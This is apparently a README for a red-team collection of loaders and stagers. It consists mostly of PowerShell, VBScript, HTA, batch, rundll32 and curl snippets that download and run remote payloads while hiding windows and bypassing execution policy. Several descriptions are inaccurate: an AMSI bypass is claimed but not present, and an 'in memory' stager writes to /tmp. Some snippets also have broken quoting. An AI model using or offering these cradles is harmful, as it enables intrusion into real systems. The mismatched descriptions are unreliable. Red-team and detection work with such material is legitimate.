# Offensive Loaders & Stagers Collection

This repository contains a curated set of offensive loaders and stagers commonly used in red team operations and penetration testing assessments. These snippets are designed for educational purposes, proof-of-concept demonstrations, and controlled environments only.

> WARNING: This code is intended for legal and authorized testing only. Do not use this repository to engage in any unauthorized or malicious activity. The author assumes no responsibility for misuse.

---

## Loaders Included

### PowerShell Loader

Bypasses AMSI and script block logging, then downloads and executes a remote payload.

```powershell
$code = '$b=new-object net.webclient;$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($b.downloadstring("http://yourserver/payload.ps1"))'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))
powershell -nop -ep bypass -enc $enc
```

---

### VBS Loader

Launches a hidden PowerShell stager from a VBScript payload.

```vbscript
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -windowstyle hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://yourserver/payload.ps1')"", 0
```

---

### HTA Loader

VBScript in an HTML Application (HTA) to invoke PowerShell.

```html
<html>
  <head>
    <script language="VBScript">
      Set objShell = CreateObject("Wscript.Shell")
      objShell.Run "powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://yourserver/payload.ps1')""
    </script>
  </head>
  <body></body>
</html>
```

---

### CMD Loader

Simple batch file to launch a PowerShell encoded command.

```bat
@echo off
powershell -nop -ep bypass -w hidden -enc JABiAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIA...
```

*(Base64 string must be replaced with your own payload)*

---

### rundll32 Loader (COM object abuse)

Executes PowerShell through COM object via `rundll32`.

```bat
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://yourserver/payload.sct")
```

WARNING: Use with hosted `.sct` payload generated via `msfvenom` or similar.

---

### Linux Curl Stager

Downloads and executes a remote ELF binary in memory.

```bash
#!/bin/bash
curl -s http://yourserver/payload.elf -o /tmp/x && chmod +x /tmp/x && /tmp/x
```

You can also use `wget`, `bash -c`, or `mktemp` as alternatives.

---

## Use Cases

- Red Team operations
- Adversary simulation
- Malware analysis research
- Detection engineering & EDR testing

---

## Author

Abdel Bolivar  
Managing Senior Consultant at Bishop Fox  
Email: abolivar@bishopfox.com

---

## License

MIT License. For research and educational use only.
